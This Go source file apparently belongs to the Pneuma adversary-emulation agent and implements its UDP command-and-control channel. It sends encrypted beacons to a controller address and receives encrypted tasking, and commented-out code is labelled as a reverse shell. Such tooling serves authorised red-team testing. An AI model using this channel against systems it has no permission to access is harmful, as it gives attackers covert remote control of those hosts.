package sockets

import (
	"bufio"
	"bytes"
	"encoding/json"
	"github.com/preludeorg/pneuma/util"
	"io"
	"net"
	"strings"
)

type UDP struct{}

func init() {
	util.CommunicationChannels["udp"] = UDP{}
}

func (contact UDP) Communicate(agent *util.AgentConfig, name string) (*util.Connection, error) {
	// Dial a UDP connection.
	conn, err := net.Dial("udp", agent.Contact["udp"])
	if err != nil {
		util.DebugLogf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Contact["udp"])
		return nil, err
	}

	// Create the Envelope Send/Recv channels.
	send := make(chan *util.Envelope)
	recv := make(chan *util.Envelope)
	ctrl := make(chan bool)

	// Create the Connection to be returned to the caller.
	connection := &util.Connection{
		Name:   name,
		Type:   "udp",
		Send:   send,
		Recv:   recv,
		Ctrl:   ctrl,
		IsOpen: true,
		Cleanup: func() {
			util.DebugLogf("[udp] cleaning up connection.")
			close(send)
			conn.Close()
			close(recv)
		},
	}

	// Write socket goroutine reads from the connection Send chan and writes to the socket.
	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			util.DebugLogf("[-] Sent UDP beacon.")
			go udpBufferedSend(conn, *envelope.Beacon)
		}
	}()

	// Read socket goroutine reads from the socket and writes to the connection Recv chan.
	go func() {
		defer connection.Cleanup()
		for {
			beacon, err := udpRead(conn)
			if err != nil {
				break
			}
			envelope := util.BuildEnvelope(beacon, connection)
			if envelope != nil {
				recv <- envelope
			}
		}
	}()

	//for len(agent.Contact["udp"]) > 0 {
	//	conn, err := net.Dial("udp", agent.Contact["udp"])
	//  	if err != nil {
	//		util.DebugLogf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Contact["udp"])
	//  	} else {
	//		//initial beacon
	//		udpBufferedSend(conn, beacon)
	//
	//		//reverse-shell
	//		scanner := bufio.NewScanner(conn)
	//		for scanner.Scan() && len(agent.Contact["udp"]) > 0 {
	//			message := strings.TrimSpace(scanner.Text())
	//			udpRespond(conn, beacon, message, agent)
	//			if len(agent.Contact["tcp"]) <= 0 {
	//				return beacon, nil
	//			}
	//		}
	//  	}
	//  	jitterSleep(agent.Sleep, "UDP")
	//}
	return connection, nil
}

// udpRead reads a message from the connection socket, decrypts it, and returns a Beacon.
func udpRead(conn net.Conn) (*util.Beacon, error) {
	scanner := bufio.NewScanner(conn)
	var beacon util.Beacon
	for scanner.Scan() {
		message := strings.TrimSpace(scanner.Text())
		err := json.Unmarshal([]byte(util.Decrypt(message)), &beacon)
		if err != nil {
			util.DebugLog("[-] Unable to decrypt TCP message.")
			return nil, err
		}
	}
	return &beacon, nil
}

//func udpRespond(conn net.Conn, beacon util.Beacon, message string, agent *util.AgentConfig){
//	var tempB util.Beacon
//	if err := json.Unmarshal([]byte(util.Decrypt(message)), &tempB); err == nil {
//		beacon.Links = beacon.Links[:0]
//		runLinks(&tempB, &beacon, agent, "\r\n")
//	}
//	refreshBeacon(agent, &beacon, "udp")
//	udpBufferedSend(conn, beacon)
//}

func udpBufferedSend(conn net.Conn, beacon util.Beacon) {
	data, _ := json.Marshal(beacon)
	allData := bytes.NewReader(append(util.Encrypt(data), "\n"...))
	sendBuffer := make([]byte, 1024)
	for {
		_, err := allData.Read(sendBuffer)
		if err == io.EOF {
			return
		}
		if _, err = conn.Write(sendBuffer); err != nil {
			util.DebugLog(err)
		}
	}
}
